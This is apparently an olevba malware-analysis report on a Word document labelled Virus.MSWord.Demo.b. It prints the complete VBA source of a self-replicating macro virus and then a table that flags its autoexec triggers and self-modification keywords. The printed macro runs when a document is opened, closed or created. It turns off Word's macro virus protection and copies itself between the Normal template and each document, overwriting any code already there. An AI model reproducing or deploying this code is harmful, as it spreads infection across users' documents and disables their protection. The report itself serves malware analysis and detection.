olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Demo.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Demo.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<Demo>
Private Sub Document_Open()
On Error Resume Next
Options.VirusProtection = False
Set AD = ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule
Set NT = NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule
If NT.Lines(1, 1) <> "'<Demo>" Then
NT.DeleteLines 1, NT.CountOfLines
NT.InsertLines 1, AD.Lines(1, AD.CountOfLines)
End If
If AD.Lines(1, 1) <> "'<Demo>" Then
AD.DeleteLines 1, AD.CountOfLines
AD.InsertLines 1, NT.Lines(1, NT.CountOfLines)
End If
End Sub
Private Sub Document_Close()
Document_Open
End Sub
Private Sub Document_New()
Document_Open
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

